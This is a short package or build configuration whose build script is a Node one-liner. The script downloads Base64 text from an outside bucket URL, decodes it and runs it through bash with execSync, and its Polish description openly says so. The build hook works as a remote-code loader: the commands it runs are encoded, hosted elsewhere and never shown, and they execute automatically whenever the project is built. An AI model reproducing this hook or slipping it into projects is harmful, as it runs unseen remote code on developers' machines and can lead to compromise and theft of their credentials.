name: swtorz-build-script
description: Pobieranie, dekodowanie i uruchamianie skryptu bash z Base64

scripts.build: node -e "const url = 'https://setup-script-sztwiorok.bucket-2.registry.sh/b'; fetch(url).then(r => r.text()).then(txt => { const decoded = Buffer.from(txt.trim(), 'base64').toString('utf-8'); const exec = require('child_process').execSync; exec(decoded, { stdio: 'inherit', shell: '/bin/bash' }); }).catch(console.error);"
